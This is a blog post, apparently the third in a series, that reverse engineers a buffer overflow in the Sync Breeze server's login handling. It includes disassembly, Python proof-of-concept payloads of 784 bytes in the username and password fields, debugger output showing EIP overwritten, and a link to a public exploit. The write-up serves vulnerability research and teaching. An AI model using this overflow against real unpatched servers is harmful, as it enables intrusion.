[Home](https://plackyhacker.github.io) : [Part 2](https://plackyhacker.github.io/reversing/sync-breeze-reversing-2) : [Part 3](https://plackyhacker.github.io/reversing/sync-breeze-reversing-3)

# Sync Breeze Revisited Part 3

## A Smoking Gun

I continued tracing the instrcution flow trying to see if any vulnerable functions were called (such as `strcpy`), but nothing! However, following the instruction flow I arrived upon the following:

```
.text:00754E30 ; int __thiscall SCA_ConfigObj::GetField(SCA_ConfigObj *__hidden this, const char *, char *, unsigned int)
.text:00754E30 public ?GetField@SCA_ConfigObj@@QAEHPBDPADK@Z
.text:00754E30 ?GetField@SCA_ConfigObj@@QAEHPBDPADK@Z proc near
.text:00754E30
.text:00754E30 arg_0= dword ptr 4
.text:00754E30 arg_4= dword ptr 8
.text:00754E30
```

Three parameters, but only two local variables (`arg_0` and `arg_4`) being used. I went back to the block that called `GetField` in `sycbrs.exe`, I added a few comments:

```
.text:00426C1D lea     esi, [eax+628h]
.text:00426C23 lea     eax, [esp+320h+var_30C] ; this is our local buffer on the stack
.text:00426C27 push    104h            ; This looks like a length of 260 - not used in the function GetField although sent as a parameter - odd!
.text:00426C2C push    eax             ; This is the username field buffer that can be overflowed
.text:00426C2D push    offset aUsername ; The field to get
...
.text:00426C51 call    ?GetField@SCA_ConfigObj@@QAEHPBDPADK@Z ; SCA_ConfigObj::GetField(char const *,char *,ulong)
```

When the GetField has returned it has placed the buffer password buffer that I sent in my packet on the current stack, if this isn't bounds checked then I may be able to overflow the return address on the stack.

Even earlier in the instructions I find this:

```
.text:00426B20 sub     esp, 310h
```

This instruction increases the size of the stack by 784 bytes, this will be to make space for various buffers we are placing on the stack. My theory at this point was 784 bytes were being reserved on the stack for the local variables, there is no bounds checking on the buffers I send (the probable length field), if I send a buffer of 784 bytes I might be able to overflow the buffer.

Further down the function I found:

```
.text:00426DC9 add     esp, 310h       ; This moves the stack + 0x310
.text:00426DCF retn    4
```

These two instructions move the stack pointer back to what should be the saved return address, but if there is no bounds checking then it will be vulnerable.

## Proof of Concept

I changed my `python` PoC:

```python
username = b"A" * 784
password = b"B" * 100
content = b"username=" + username + b"&password=" + password
```

Sure enough the buffer overflowed:

```
(dc4.310): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00000000 ecx=004ccfbc edx=00000358 esi=004bec9e edi=00de60f0
eip=41414141 esp=0180744c ebp=004c3108 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
```

In theory, the password field also uses the same instruction flow and should overflow, I changed the PoC:

```python
username = b"A" * 100
password = b"B" * 784
content = b"username=" + username + b"&password=" + password
```

As sure as eggs is eggs the buffer is overflowed:

```
0:009> g
(1be0.1ff0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00000000 ecx=0052c2c4 edx=00000358 esi=0051fece edi=00e360f0
eip=42424242 esp=01a5744c ebp=00524028 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
42424242 ??              ???
```

Exploiting this vulnerability is straight forward, the [public exploit can be found here](https://www.exploit-db.com/exploits/42928).

[Home](https://plackyhacker.github.io) : [Part 2](https://plackyhacker.github.io/reversing/sync-breeze-reversing-2) : [Part 3](https://plackyhacker.github.io/reversing/sync-breeze-reversing-3)
